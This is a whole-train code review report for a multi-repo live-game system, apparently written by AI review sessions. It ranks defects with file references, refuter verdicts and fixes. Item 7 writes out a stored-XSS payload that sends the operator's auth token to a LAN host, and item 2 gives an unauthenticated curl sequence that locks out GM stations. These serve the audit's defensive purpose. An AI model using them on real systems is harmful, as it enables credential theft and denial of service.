# Whole-train review — 2026-09-05

**The pre-merge gate for "coherent on main" (ROADMAP §3; ratified at the roadmap r4 grill, Q1r).**
Reviewed by a fresh-context session on `main` (a4ebacd = production-2026-07) over the full combined diff of the
19-vehicle merge train recorded in `docs/plans/PHASE3-STATUS.md` §"Merge train". Every candidate finding below
was sent to an adversarial refuter; every surviving MAJOR was additionally reproduced by the orchestrating session
in a tree no other agent used. Nothing in the trees under review was modified.

## 0. Verdict

**The train is coherent. Walk it, with fixes.** Contracts, pins, schemas and clients agree at the tip; every
suite that was run is green; the parity surface (backend rules vs standalone scanner) agrees on every executed
scenario across four packs; the one unconfirmed regression candidate (Appendix B item 5) is cleared. What the
review found is eight MAJOR defects that survive refutation. Three are regressions the train introduces, two are
new failure modes in new code, and three are pre-existing on `main` and simply ride along into the merged tree.
None of them makes `main` incoherent (nothing fails to merge, boot, or pass), so a hold is not warranted. They do
need to land before the coherent-on-main state is claimed, and the two show-night ones (§1.1 items 1 and 2)
before any venue rehearsal.

| Repo | PRs | Verdict | Why |
|---|---|---|---|
| ALN-Ecosystem (parent) | #19 → #33 | **walk-with-fixes** | 6 MAJORs live here: scoreboard freezes when it connects after the session exists (train regression); corrupt `game.json` boots silently on baked ALN tables (new code); preflight §13.3 false-fails on every healthy machine (docs regression); preset load can write a pack the engine refuses to boot (new consequence of the new gate); five unauthenticated GETs lock every GM station out (pre-existing); reset-then-delete resurrects pre-reset adjustments (pre-existing). All have one-function fixes. |
| ALNScanner (GM scanner) | #15 (subsumes #12–#14) | **walk-with-fixes** | Pack cue `icon` reaches an HTML attribute unescaped (pre-existing sink, newly fed by pack content = XSS in the admin panel); standalone "Reset All Scores" leaves tokens locked and is undone by the next delete (pre-existing divergence from the backend's ruled reset). |
| ALN-TokenData | #6 (subsumes #2–#5) | **walk** | Migration is faithful (81/81 tokens, scoring values identical, 10/10 cues preserved, manifests fresh, both real packs schema-valid). Two doc NOTEs only. |
| ALNPlayerScan (PWA) | #6 | **walk** | Visibility-only change as ledgered (L3). One MINOR (stale pack identity can display as current). The pre-v2 nested `data/` pin is a cutover-list item, not this PR's. |
| arduino-cyd-player-scanner (ESP32) | #7 | **walk** | No findings; absent pack block is handled on both sides. |

**Recommended fix vehicle.** Because every parent vehicle is a stacked superset, the cleanest way to keep the
train's structure is one new vehicle cut from `claude/phase3-docs-repair` carrying the fixes for §1.1 items
1–5 and 7 (all in files the train already touches), walked last. Items 6 and 8 are pre-existing on `main`
and can ride the same vehicle or Block 2 (hardening); they are not train regressions. Whether to amend individual
vehicles instead is the owner's call; this review only asks that the fixes exist before "coherent on main" is
declared.

## 1. Findings (ranked by severity; each with its refuter's verdict)

Severity vocabulary: MAJOR = would break a show night, corrupt or lose data, mis-score, a security hole reachable
on the venue LAN, or make `main` incoherent. MINOR = real defect with bounded impact, an unledgered debt, or a
false-green test on a non-critical path. NOTE = worth recording, not blocking. "Regression" = differs from
production behaviour and is not an Appendix B ruled change; "pre-existing" = byte-identical logic on `main`.

### 1.1 MAJOR — 8 survive (1 further candidate downgraded to MINOR by its refuter)

**1. LA-1 · Venue wall scoreboard never joins the session room when it connects after the session exists — it then receives none of `transaction:new` / `score:adjusted` / `scores:reset` / `transaction:deleted` for the rest of the game.** *Regression*, introduced by train commit dc23d60 (B0 BS.2).
- ALN-Ecosystem `backend/src/websocket/gmAuth.js:61,112-116` (`const isDisplay = socket.tier === 'device'`; the session-room join sits inside `if (session && !isDisplay)`); the only emitters of those four events target `session:<id>` (`backend/src/websocket/broadcasts.js:216,249,267,307`); `backend/public/scoreboard.html:1660-1671` drives both the evidence board and the score ticker from `transaction:new`. On `main` the guard is `if (session) {` (gmAuth.js:97) with no display term.
- Failure: GM creates the session at 19:50; the kiosk page is opened, reloaded, or reconnects after an orchestrator restart at 19:55. The scoreboard paints the `sync:full` snapshot and then freezes: no new evidence, no score movement, no reset. It still shows LIVE because gm-room traffic keeps its activity timer fresh, and Appendix B item 12's ruled recovery ("page reload") lands on the same broken path. Only the display-connects-before-session ordering works (retro-join at broadcasts.js:672), which is also the only ordering the three scoreboard E2E flows exercise.
- Refuter (Fable): SURVIVES, MAJOR. Strongest counter tried: Appendix B items 12/13 rule the display carve-out; neither rules out live delivery, and the carve-out's own comment (gmAuth.js:53-56) says the display "joins its rooms and gets sync:full".
- Orchestrator reproduction: confirmed by code (tip guard vs `main` guard; emit sites).
- Fix: join `session:<id>` for display sockets too (keep them out of the GM-station count, which is the ruled part).

**2. LC-2 · Five unauthenticated HTTP GETs permanently lock every GM station out of the running session.** *Pre-existing on `main`* (byte-identical logic); survives into the merged tree.
- ALN-Ecosystem `backend/src/routes/healthRoutes.js:43-83` (client-chosen `deviceId` and `type=gm` registered as `connected`, no auth, mounted at `/` outside the `/api/` rate limiter, `app.js:110,121`); `backend/src/services/heartbeatMonitorService.js:99-103` skips `gm`-typed devices, so an HTTP-injected GM entry is never reaped; `backend/src/models/session.js:345-348` counts connected GMs against `maxGmStations` (default 5); `gmAuth.js:84` refuses the handshake with `DEVICE_LIMIT_REACHED`.
- Failure: anyone on the kit's LAN runs five `curl /health?deviceId=FAKE_n&type=gm`. Every GM scanner is refused at the socket handshake for the life of the session, and because `session:create` is itself a GM socket command there is no in-band recovery.
- Refuter (Fable): SURVIVES, MAJOR; live-probed permanence after the 30 s heartbeat window.
- Orchestrator reproduction: in-process against the real Express app with supertest: `canAcceptGmStation()` true → five GETs → false; session lists `FAKE_1..5:connected`.
- Fix: refuse `type=gm` on `/health` (no scanner client sends it; the player scanner sends `type=player`), or require the operator token for GM registration.

**3. F-P2-1 · An unparseable `game.json` is read as "this pack ships no rules": activation succeeds, the engine silently runs the baked ALN shims, and `validate-pack.js` reports `ok: true`.** *New code* (packService is new on the train).
- ALN-Ecosystem `backend/src/services/packService.js:217-227` (`_readDiskGameConfig` catches the parse error, warns, returns `null`, discarding the ENOENT-vs-parse distinction it computed; a literal `null` file produces no warn at all), `:695` (the whole game.json half of the gate is skipped when null), `:1157-1160` (activation proceeds with a valid manifest identity); `backend/scripts/validate-pack.js:40-48`.
- Failure: the operator edits `ALN-TokenData/game.json` on the Pi (the file's own comment tells them to, `packService.js:1327`), leaves a trailing comma, restarts. The backend boots, `/health` and `sync:full` advertise a valid `contentHash`, and: all show cues are gone, pack strings and theme are gone, `surfaces` is gone, the clock reverts to `SESSION_TIMEOUT`, scoring falls to the baked ALN tables (coincidentally right for ALN, flatly wrong for any second pack: a toy token worth 3,600 scores 250,000). Only warn lines, on a boot nobody watches. The config tool's publish gate (`config-tool/lib/publish.js:140-152`) trusts the same `ok: true`.
- Refuter (Fable): SURVIVES, MAJOR; reproduced on both packs, with and without a manifest rebuild. Narrowing: the config tool cannot itself author invalid JSON, so the designer-loop leg needs a corrupt live pack or a hand-edited draft.
- Orchestrator reproduction: trailing comma in a toy-pack copy → `validate-pack.js` `{"ok":true,...,"problems":[]}` exit 0; in-process `getGameConfig()` null, `baseValues[5]` 150000 (toy declares 500), `getCues()` null, `getStrings()` null.
- Independent confirmation: Lens D reached the same defect by mutation (LD-1, its M6c probe: no test feeds the engine an invalid `game.json`) and proved it on a truncated copy of the real ALN pack, which activates with the healthy pack's identity and `contentHash`. Its refuter agrees on the narrowing: the config tool's publish path is atomic and cannot produce the corruption; a hand edit, a merge marker, or a `PACK_PATH` pack can.
- Fix: in `_readDiskGameConfig`, treat parse error and non-object result as gate refusals; only ENOENT is the packless posture.

**4. F-P11a-1 · Preflight §13.3 fails deterministically on a healthy machine: it lower-cases pack type keys that `getScoringRules()` returns exact-case.** *Regression* introduced by the docs-repair vehicle (#33).
- ALN-Ecosystem `docs/preflight-checklist.md:1516` (`const key = type.toLowerCase()`), vs `backend/src/services/packService.js:136-146` (exact-case keys, D2b) and `docs/SCORING_LOGIC.md:28-31`. On `main` the same check read `config.game.typeMultipliers`, which `main`'s `config/index.js:80` lower-cased, so it was correct; the rewrite swapped the data source without updating the key.
- Failure: a REQUIRED pre-show check prints `6 mismatches found` on every correctly packed machine and can never print its documented "OK" line; its remediation text sends the operator hunting for a pack rollback or a stale `PACK_PATH`.
- Refuter (Fable): SURVIVES, MAJOR (docs-only, but the audience is the human running the go/no-go).
- Orchestrator reproduction: block run verbatim → 6 mismatches; exact-case key → 0.
- Fix: drop the `.toLowerCase()`.

**5. F-P5a-1 · Preset load/import is an un-gated live-pack scoring writer: it can leave `ALN-TokenData` un-activatable while reporting success.** *New consequence* of the train (the engine's activation gate is new, and BS.2 closed every other direct live-pack route, leaving presets the sole ungated writer).
- ALN-Ecosystem `config-tool/lib/routes.js:335-344,371-390` → `config-tool/lib/configManager.js:386,134-164` (`writeScoring` merges into the live `game.json` and regenerates a consistent manifest); the only check is `validators.js:34-67`, which has no type-coverage rule; the engine refuses such a pack at boot (`packService.js:836-857`), `app.js:192` has no catch, `server.js:333-335` exits, PM2 gives up after 10 restarts.
- Failure: an operator imports a preset from another install (the README invites it, `config-tool/README.md:154-156`), or loads a same-install preset saved before the pack's type table changed. 200 and a success toast; the next orchestrator start does not boot.
- Refuter (Fable): SURVIVES-NARROWED, MAJOR: trigger bounded to an ill-fitting preset (foreign import or stale same-install preset); the happy-path round trip of an unchanged pack is byte-identical and safe.
- Orchestrator reproduction: foreign preset import + load on a toy-pack copy → `typeMultipliers` becomes `{"Personal":1}`, manifest regenerated consistently, `validate-pack.js` EXIT 1 "CAPABILITY GATE: refusing to activate … tokens use memory type 'Technical' …".
- Fix: run the engine gate (`validate-pack.js`) before `writeScoring` on the preset path, or route preset scoring through draft → publish like every other pack write.

**6. P1-1 · "Reset All Scores" followed by any transaction delete resurrects the pre-reset admin adjustments.** *Pre-existing on `main`*; the file is edited by the train and the fix is one line.
- ALN-Ecosystem `backend/src/services/transactionService.js:566-585` (`resetScores` → `TeamScore.reset()`, which preserves `adminAdjustments`) and `:826-834` (`rebuildScoresFromTransactions.applyRow` replays the full adjustment delta sum onto the recomputed base).
- Failure: adjust Team A +50,000 → reset → 0 → new game, Team A scans a $150,000 token → GM deletes it (wrong team) → score is 50,000, not 0, and comes back after every future delete.
- Refuter (Fable): SURVIVES, MAJOR. Counter tried: "adjustments are kept as an audit trail"; keeping the ledger does not require replaying it after a reset whose own output declared it void. The adjust→reset→delete sequence is untested (sessionService.test.js:1127 and transactionService.test.js:1850 each cover a neighbour).
- Orchestrator reproduction: real services in memory: `1. 50000 / 2. 0 (adminAdjustments kept: 1) / 3. 150000 / 4. 50000 (expected 0)`.
- Fix: clear (or epoch-stamp) `adminAdjustments` on reset, so the rebuild replays only post-reset deltas.

**7. LC-1 · Pack cue `icon` is interpolated raw into two HTML class attributes in the GM admin panel — stored XSS from pack content.** *Pre-existing sink* (`CueRenderer.js` is byte-identical on `main`), *newly exposed* by the train: cues moved from engine-owned venue config into pack content, the lowest trust tier (CONTEXT.md §6), editable through the config tool's free-text Icon field.
- ALNScanner `src/ui/renderers/CueRenderer.js:73,78`; no gate rejects markup in the field (`backend/src/gameRules/cueValidation.js:255-370` has no icon rule; `cues.schema.json`'s pattern is not enforced at runtime; CSP is disabled at `backend/src/app.js:46`); `cueEngineService.js:177-190` copies `icon` verbatim into the `service:state` push. The engine already guards the identical shape for `modes[].icon` (`modeSemantics.js:111-116`) and ships `slugify.js` for exactly this purpose.
- Failure: a cue with `icon: "x\" onmouseover=\"fetch('http://10.0.0.9/?t='+localStorage.aln_auth_token)\" data-y=\""` activates; the GM opens the admin panel; the script runs in the origin holding the 24-hour operator JWT. Precondition: pack-write access (config tool beyond loopback, a hand-edited `cues.json`, `PACK_PATH`, or draft → publish).
- Refuter (Fable): SURVIVES, MAJOR. Counter tried: self-XSS because author and operator are one production; fails on the project's own trust model, which built the cue floor precisely so a cue can never reach session lifecycle or system reset.
- Orchestrator reproduction: jsdom run of the unmodified renderer: `<button class="cue-tile cue-tile--x" onmouseover="window.__pwned=1" …>`.
- Fix: slugify or escape `icon` at the sink, and add the `cues.schema.json` pattern to `validateCuesBlock` (also closes F-P5b-2).

**8. LB-1 · Standalone "Reset All Scores" is not the backend's reset: it leaves every token permanently unclaimable, keeps stale group state, and is silently undone by the next transaction deletion.** *Pre-existing on `main`* (LocalStorage.resetScores is identical); the backend's ruled A3 full-restart fix never got a standalone twin.
- ALNScanner `src/core/storage/LocalStorage.js:257-275` zeroes score/baseScore/bonusPoints/adminAdjustments only; the backend (`transactionService.resetScores` + `session/persistenceListeners.js:45-49`) also clears `tokensScanned`, `completedGroups`, all transactions and the device registry. Standalone keeps all three transactions, every token stays in `scannedTokens` ("Token Already Scanned" on every re-tap), `_checkGroupCompletion` bails on the stale `completedGroups` (`:381`), and `removeTransaction → _recalculateTeamScores` (`:485-517`) replays the survivors.
- Failure (toy pack, both sides start at 19,800 with the Vault Plans group complete): backend after reset → 0, re-scan accepted (+3,600). Standalone after reset → 0 but `tokensScanned` 3, group still complete, all three tokens locked; delete one stale transaction → score jumps to 3,000.
- Refuter (Fable): SURVIVES, MAJOR. Also notes the networked client does not clear its own `scannedTokens` set on `scores:reset` (NetworkedStorage.js:418-452), so the "locked on this station" symptom is not unique to standalone (MINOR twin, LB-5 covers the dialog text).
- Orchestrator reproduction: both harness halves re-run: backend `{score:0,tokensScanned:0,completedGroups:[]}`, rescan accepted; scanner `{score:0,tokensScanned:3,completedGroups:["Vault Plans"]}`, `scannedStillLocked:[true,true,true]`, after delete `score:3000`.
- Fix: make `LocalStorage.resetScores` perform the A3 full restart (clear transactions, `scannedTokens`, `tokensScanned`, `completedGroups`), and clear the client set on `scores:reset` in networked mode.

**Downgraded by its refuter — P4-1 (finder MAJOR → MINOR):** mDNS `.local` page origins pass the HTTP CORS regex (`backend/src/app.js:65`) but not the Socket.io one (`backend/src/websocket/socketServer.js:29`), so a GM scanner or scoreboard page loaded from `https://<name>.local` gets a working HTTP surface and a silently rejected WebSocket handshake; `.env.example:29-30` claims `.local` is auto-allowed. Pre-existing on `main`; narrowed because every documented GM, scoreboard and kiosk path uses an IP or `localhost`, which pass. Listed with the MINORs.


The MINOR survivors fall into six groups. The full table follows; the file:line and refuter verdict for each is
in the table, and the finder and refuter reports are in the review's evidence bundle (§4.6).

- **Security posture, pre-existing on `main`, not train regressions** (fix in Block 2 hardening): P4-2 / LC-3 (the read plane has no credential: a socket asserting any non-`gm` `deviceType` connects with no token and can read full game state over WebSocket and HTTP; deliberate and test-pinned, but undocumented as a standing constraint); P4-1 (the `.local` CORS asymmetry above); LC-3's narrowing notes the observe token was designed for exactly this surface and is not required.
- **Scoreboard and display class** (same family as MAJOR 1): LA-2 (a display socket that connects before the session is registered as a GM station by `initializeSessionDevices`, undoing the ruled carve-out); P3-1 (`service:state{domain:'gameclock'}` omits `expectedDuration`, so the wall countdown total resets to 7200 on every push; invisible for ALN whose duration is 7200, wrong for any other pack).
- **Standalone scanner divergences** (Lens B; all pre-existing, none reachable with ALN's production data except LB-4): LB-2 (backend floors token values, scanner does not: a gate-legal fractional multiplier scores differently); LB-3 (scanner type lookup reaches the prototype chain; backend was hardened); LB-4 (an unrecognised tag is recorded, locked and counted in standalone where the backend rejects it); LB-5 (the reset confirm dialog promises "Transactions will be preserved", false in networked mode). Lens B otherwise found **zero** value/bonus/duplicate divergences across four packs and every scenario in its table.
- **Config tool** (B0; the tool is pre-show, not show-night): F-P5a-2 = F-P5b-1 (preset Export downloads a 401 body under the preset's name, a regression of the auth flip); F-P5a-3 (README describes the pre-auth tool); F-P5a-4 (publish writes into the `ALN-TokenData` submodule working tree with no commit step and no warning: unledgered debt); F-P5b-2 (cue editor writes `icon` values the schema forbids and the publish gate does not catch: the authoring side of MAJOR 7); F-P5b-3 (select/range controls display defaults they never store, so a new command is refused as "needs 'enabled'"); F-P5b-4 (the server's `details` array is dropped, so every gate refusal reads "Invalid cues config"); F-P5b-5 (a draft deleted server-side wedges the other tab until reload); F-P5b-6 (545 lines of self-declared THROWAWAY prototype ship to `main` with no ledger row).
- **Pack service and validators**: F-P2-2 (`_readPackTokens` swallows a parse error, so `validate-pack.js` green-lights a pack the engine refuses to boot on); F-P2-3 (the two manifest builders diverge on symlinks, and a Python-built inventory serves a symlinked file from outside the pack directory through `/api/pack/files/`; traversal by path is otherwise solid); F-P2-5 (the `display` half of the L1 baked shim is not drift-pinned though the test says "drift-mirrored"; same as F-P8a-2); F-P7-1 (`session:validate` dies with a raw module error on a pack without `game.json`, which is exactly `main`'s TokenData pin); P1-2 (the slice-1 legacy-history default mode never runs on the restore path); P1-3 (cue vocabulary advertises three `transaction:accepted` condition fields the payload never carries); P4-3 (`PUT /api/music/playlists` newly gated but OpenAPI still documents it as open).
- **Docs that gate hardware-proven** (the deployment-docs repair vehicle): F-P11a-2 (the guide points the new-machine builder at `ALN-TokenData/assets/`, which does not exist); F-P11a-3 (scoreboard auth documented as `ADMIN_PASSWORD` injection in four places; the code injects a per-serve observe JWT); F-P11a-4 (preflight still requires `spotifyd` in the master go/no-go block; two of ten sites are this diff's, the rest ledgered doc debt).
- **Test infrastructure**: P9b-1 (`restartOrchestrator()` drops an explicitly pinned `packPath`/`profilePath`); P9b-5 (the shared E2E scanner-init helper picks the mode by the ALN `'detective'` literal, so the dual-pack matrix's toy leg runs the wrong mode selection); S1-2 = S2-1 (`src/core/theme.js` is the one scanner source file with no coverage floor); S1-1 (pack money affixes containing `|` split the session-report markdown tables); WE-1 (the PWA config page can show a stale pack identity as current); LA-3 (the PWA still serves pre-v2 token data: cutover-list item 6 is not satisfied by any train vehicle, which the cutover list itself anticipates); LA-5 (the committed asset manifest is unfiltered: 20 MB of the ESP32's first-boot sync is for tokens it will never display).

### 1.2 MINOR — 36 survive

| # | Repo | File:line | Finding | Refuter verdict |
|---|---|---|---|---|
| P1-2 | ALN-Ecosystem | `backend/src/models/transaction.js:35-44 (legacy default); ` | The slice-1 "legacy-history default mode" never runs on the restore path, so a pre-`mode` persisted session lo | SURVIVES |
| P1-3 | ALN-Ecosystem | `backend/src/gameRules/cueVocabulary.js:26-38 (normalizer); payl` | The cue-authoring vocabulary advertises three `transaction:accepted` condition fields the payload never carrie | SURVIVES |
| P4-1 | ALN-Ecosystem | `backend/src/websocket/socketServer.js:29 (vs backend/src/app.j` | mDNS .local origins pass HTTP CORS but are refused by the Socket.io CORS gate | SURVIVES-NARROWED |
| P4-2 | ALN-Ecosystem | `backend/src/websocket/socketServer.js:46-49 (with backend/src/` | WebSocket auth is gated on the client-asserted deviceType, so any other value connects unauthenticated and can | SURVIVES-NARROWED |
| P4-3 | ALN-Ecosystem | `backend/src/routes/musicRoutes.js:40 (contract at backend/` | PUT /api/music/playlists was newly gated behind requireFunction('show-control') but OpenAPI still documents it | SURVIVES |
| P3-1 | ALN-Ecosystem | `backend/src/websocket/broadcasts.js:487-493, 572-576 (with b` | service:state{domain:'gameclock'} omits expectedDuration, so the wall scoreboard resets its countdown total to | SURVIVES-NARROWED |
| P9b-1 | ALN-Ecosystem | `backend/tests/e2e/setup/test-server.js:357-383` | restartOrchestrator() silently drops an explicitly pinned packPath/profilePath | SURVIVES |
| P9b-5 | ALN-Ecosystem | `backend/tests/e2e/helpers/scanner-init.js:110-115` | The shared scanner-init helper still picks the game mode by the ALN 'detective' literal; the dual-pack matrix  | SURVIVES-NARROWED |
| S2-1 | ALNScanner | `.coverage-thresholds.json:whole file (gates: scrip` | src/core/theme.js is the only source file with no coverage floor — CI cannot see the theme unit's headline mod | SURVIVES |
| S1-1 | ALNScanner | `src/core/sessionReportGenerator.js:237 (also 119, 267)` | Pack-declared money affixes bypass the report's _cell sanitizer and can split the session-report tables | SURVIVES-NARROWED |
| S1-2 | ALNScanner | `.coverage-thresholds.json:absent key './src/core/t` | src/core/theme.js is the one src/ file with no coverage-ratchet entry, so the ratchet can never fail on it | SURVIVES |
| WE-1 | ALNPlayerScan | `aln-memory-scanner/js/app.js:98-124 (with config.html` | PWA config page can display a stale pack identity as current (localStorage never cleared on failure) | SURVIVES-NARROWED |
| LB-2 | ALN-Ecosystem | `backend/src/services/tokenService.js:67 (vs ALNScanner/src/co` | Backend floors token values, the scanner does not — a gate-legal fractional multiplier scores differently netw | SURVIVES |
| LB-3 | ALNScanner | `ALNScanner/src/core/scoring.js:205-211` | Scanner type-multiplier lookup still reaches the prototype chain (NaN) where the backend was explicitly harden | SURVIVES-NARROWED |
| LB-4 | ALNScanner | `ALNScanner/src/app/domains/gameOps.js:259-263 (with ALNScanner` | An unrecognised tag is recorded, locked and counted in standalone; the backend rejects it outright | SURVIVES-NARROWED |
| LB-5 | ALNScanner | `ALNScanner/src/app/domains/gameOps.js:479` | The reset confirmation promises "Transactions will be preserved"; in networked mode the reset deletes the whol | SURVIVES-NARROWED |
| LC-3 | ALN-Ecosystem | `backend/src/server.js:75-103 (with websocket/s` | Full game state is readable with no credential over both WebSocket and HTTP | SURVIVES-NARROWED |
| LA-2 | ALN-Ecosystem | `backend/src/websocket/broadcasts.js:641-672` | initializeSessionDevices registers display-class scoreboard sockets as GM stations, undoing the gmAuth carve-o | SURVIVES |
| LA-3 | ALNPlayerScan | `aln-memory-scanner/js/app.js:64 and 99-102 (pin: aln-` | PHASE3-STATUS cutover item 6 is not satisfied: the PWA still serves token data from a pre-v2 pin while reporti | SURVIVES |
| LA-5 | ALNPlayerScan | `aln-memory-scanner/assets/manifest.json:1 (version "2026-07-17T2` | Committed asset manifest is stale and unfiltered: 20.1 MB of the ESP32's 38.8 MB first-boot sync is for tokens | SURVIVES-NARROWED |
| F-P2-2 | ALN-Ecosystem | `backend/src/services/packService.js:267-273, consumed at 842` | _readPackTokens() swallows a parse error, silently disabling both "unconditional" coverage gates — and validat | SURVIVES-NARROWED |
| F-P2-3 | ALN-Ecosystem | `backend/scripts/build-pack-manifest.js:51-69 (Node walk); scrip` | The two manifest builders diverge on symlinks (byte-parity claim is false), and resolvePackFile's containment  | SURVIVES |
| F-P2-5 | ALN-Ecosystem | `backend/src/services/packService.js:114-116; backend/tests/u` | False green: the display half of the L1 baked scoring shim is not drift-pinned, though both the source comment | SURVIVES |
| F-P5a-2 | ALN-Ecosystem | `config-tool/public/js/utils/api.js:158-164` | BS.3 auth flip silently breaks preset Export — the browser downloads a 401 body named as the preset | SURVIVES-NARROWED |
| F-P5a-3 | ALN-Ecosystem | `config-tool/README.md:11, 233, 234, 259, 261-2` | README.md documents the pre-BS.3 tool — 'no authentication', http://, and two write routes that now 409 | SURVIVES |
| F-P5a-4 | ALN-Ecosystem | `config-tool/lib/publish.js:165-192` | Unledgered debt: publish writes into the ALN-TokenData submodule working tree with no commit step and no opera | SURVIVES-NARROWED |
| F-P5b-1 | ALN-Ecosystem | `config-tool/public/js/utils/api.js:158-164` | Preset export downloads a 401 error body instead of the preset — the auth gate has no path for the <a href> do | SURVIVES-NARROWED |
| F-P5b-2 | ALN-Ecosystem | `config-tool/public/js/components/cueEditor.js:99-108 (esp. 105)` | Cue editor writes icon values that violate the tip cues.schema.json, and the publish gate does not catch them  | SURVIVES |
| F-P5b-3 | ALN-Ecosystem | `config-tool/public/js/components/commandForm.js:379-393 (range), 395-403` | Payload controls display a value they never store — commands built from select/range/boolean-select/sink-picke | SURVIVES-NARROWED |
| F-P5b-4 | ALN-Ecosystem | `config-tool/public/js/utils/api.js:32-36` | api.js throws away the server's details array, so every gate refusal reaches the operator as the bare string " | SURVIVES-NARROWED |
| F-P5b-5 | ALN-Ecosystem | `config-tool/public/js/utils/api.js:72-80 (resumeDraft), 95-` | A draft deleted server-side wedges the session: publish/discard/save all 404 forever and the store is never cl | SURVIVES |
| F-P5b-6 | ALN-Ecosystem | `config-tool/public/js/sections/packs.js:481 lines (NEW); config-` | Unledgered transitional debt: 545 lines of self-declared THROWAWAY prototype ship to main | SURVIVES |
| F-P7-1 | ALN-Ecosystem | `backend/scripts/lib/packResolver.js:63-68` | session:validate dies with a raw Cannot find module .../game.json when the resolved pack has no game.json | SURVIVES-NARROWED |
| F-P11a-2 | ALN-Ecosystem | `DEPLOYMENT_GUIDE.md:810 (new), 689 and 657-6` | DEPLOYMENT_GUIDE points the new-machine builder at ALN-TokenData/assets/, which does not exist — scanner image | SURVIVES-NARROWED |
| F-P11a-3 | ALN-Ecosystem | `DEPLOYMENT_GUIDE.md:379-381, 1316-1319, 1554` | Scoreboard auth is documented as ADMIN_PASSWORD injection in four places; code injects a per-serve OBSERVE JWT | SURVIVES |
| F-P11a-4 | ALN-Ecosystem | `docs/preflight-checklist.md:1662 (master summary), 2` | preflight-checklist.md still requires/reports spotifyd in 10 places — including the master-summary go/no-go bl | SURVIVES-NARROWED |


### 1.3 NOTE
Fifty-nine NOTE-level candidates survived refutation. They are listed in Appendix A with verdicts; none blocks
the walk. The ones most worth a follow-up ticket: F-P8b-2 / F-P11a-6 (four backend `src/` modules, including the
authorization floor table, have no coverage floor); F-P9a-4 (nothing pins the FLOOR action map to the AsyncAPI
enum, so a new `gm:command` family lands ungated by default: the `grants.js` comment records this happened once
already); F-P2-7 (a pack content edit without a manifest rebuild is silent); LA-7 (`gm:identified` is emitted but
in no contract and no client); P1-observation (`transaction:deleted` carries a dead `allTeamScores` field).

## 2. Cleared

### 2.1 Refuted candidates (6)
| # | Candidate | Why it was refuted |
|---|---|---|
| P1-4 | `BAKED_MONEY_SPEC` is a silent shim with no ledger row | The money bake was explicitly classified in the 3b slice design as a strings-class presentation fallback ("no loud shim") and that posture rode into a closed slice record and a pinning test; not a rules-data shim of the L1/L6 class. |
| P4-4 | AsyncAPI says the server records the client `packHash` on the device connection; nothing does | `socket.packHash` records it and a green unit test named with the contract's phrasing pins it; the finder read "device connection" as the `DeviceConnection` model. |
| P9b-3 | `engine.sh stop` escalates SIGKILL to the runuser wrapper, orphaning the engine | The mechanic is real in isolation but unreachable: runuser's own parent escalates to SIGKILL of the child at ~2 s, so the loop exits ~8 s before the escalation branch; proven with a child that ignores SIGTERM. |
| P9b-7 | 07b TEST 4 (networked group bonus) self-skips on the production leg | 07c pins parity-pack unconditionally and asserts the networked total including the group bonus; the item is also owner-ruled by name in PHASE3-STATUS.md:838. |
| LC-5 | Unauthenticated `/api/scan` writes have no ledger row | Misclassification: the ledger governs deliberately transitional constructs; anonymous player scans are a standing constraint with a named home (ROADMAP Track E), and the Phase-4 session tier is pseudonymous by design. |
| F-P9a-5 | The "HTTP surface" auth proof never goes through Express, so dropping the music-route gate fails no test | False: `tests/unit/routes/musicRoutes.test.js` already covers the no-token, observe-token and operator-token legs through the real mount; the finder grepped only the contract file. |

### 2.2 Appendix B item 5 — the transaction-card accent border: **CLEARED**
Three independent reviewers (S1, S2, Lens A) reached the same result, and the orchestrator re-ran the grep. The
rules the train deleted (`main` `ALNScanner/src/styles/screens/scanner.css:201-207` `.transaction-card.detective`
/ `.transaction-card.blackmarket`, and `components.css:195-201` `.card-accent.*`) were dead CSS: no file under
`src/**/*.js` or `index.html` emits either class on `main` or on the tip, the prebuilt `dist/` bundle contains
zero occurrences, and the history screen renders Game Activity `.token-card`s via `gameOps.js:406-408`. The live
equivalent (the Game-Activity status bar and claim rows) was re-keyed to `--color-mode-scoring` /
`--color-mode-evidence` and that re-key is pinned on both sides (`tests/unit/ui/cssTaxonomy.test.js:37-52`,
`tests/unit/ui/renderers/gameActivityClasses.test.js`). No visible change; nothing for a screen test to catch.
Residue: the tip's `ALNScanner/docs/PLAYWRIGHT_TESTING_GUIDE.md:174,179,502,526` still prescribes the dead
selector (LA-9, NOTE).

### 2.3 Ruled or ledgered items encountered and not reported
Appendix B items 1–4 and 6–16 (all seen in the diff; none re-raised). Ledger rows L2/L9 (scanner scoring shim
and non-restore), L3 (PWA visibility-only, nested `data/` pre-v2), L6 (baked mode tables; both drift tripwires
verified to read the real `game.json`), L7 (`lightingRoleFallbacks`; its tripwire is now non-vacuous, iterating
all 7 roles), L8 (the ENDGAME `target: "bluetooth"` literal, present verbatim in `ALN-TokenData/cues.json`),
L12 (idle-loop config fallback), L13 (ALN wording in report structure), L14 (NFC tools' CDN fonts). The committed
`backend/.env` (rotation ratified). The committed `backend/ssl/key.pem` (LC-4) predates the train and is
unchanged by it: a self-signed LAN identity, recorded as a NOTE, not a train finding.

### 2.4 Verified sound (the things the review set out to check and found correct)
- **Pack migration fidelity** (P6): 81/81 tokens identical field-for-field except the single ruled v2 shape change (`SF_Group` suffix → `game.json` groups: one token, `nat001`); scoring values byte-equal to the deleted `scoring-config.json`; all 10 venue cues migrated 1:1 (only the five ruled id renames; every `sceneId` resolves back through the fallback table); all three pack manifests fresh and both builders byte-identical on symlink-free trees; both real packs and both real profiles schema-valid; no markup or bidi characters in any strings/theme leaf.
- **Scoring and duplicate parity** (Lens B, executed on both sides across ALN, toy-heist, parity-pack and a synthetic non-consuming pack): zero divergences in token values, group completion, bonus amounts and timing, mixed-mode groups, non-consuming claims, all four duplicate rulings, deletion rebuild, the `allowNegative` floor, unknown-mode history, and money formatting. The one divergence class (a `none ∧ countsTowardGroups ∧ non-consuming` mode) is refused at activation on both sides.
- **Live path vs rebuild path** (P1): 60,000 random histories across all six gate-legal mode shapes, zero mismatches.
- **Post-session validator vs engine** (P7): 4,000 random cases, zero mismatches; a deliberately mis-scored session fails loudly (on `main` the same session false-passed).
- **Activation gate** (P2): 62 mutated packs, every focus-question rule refuses; path traversal on `/api/pack/files/` 404s for every encoding tried.
- **Cross-repo coherence** (Lens A): all four parent pins equal the submodule PR heads; scanner `MESSAGE_TYPES` is set-equal to the AsyncAPI subscribe set; every action the GM scanner sends exists in the executor and the contract; every client fetch URL has a route; the bundled scanner tier ships the themed TokenData byte-identical to the submodule.
- **Contract tests** (P9a): load the real schemas and the real packs from disk, drive the real Express app, compare both directions where they claim to.
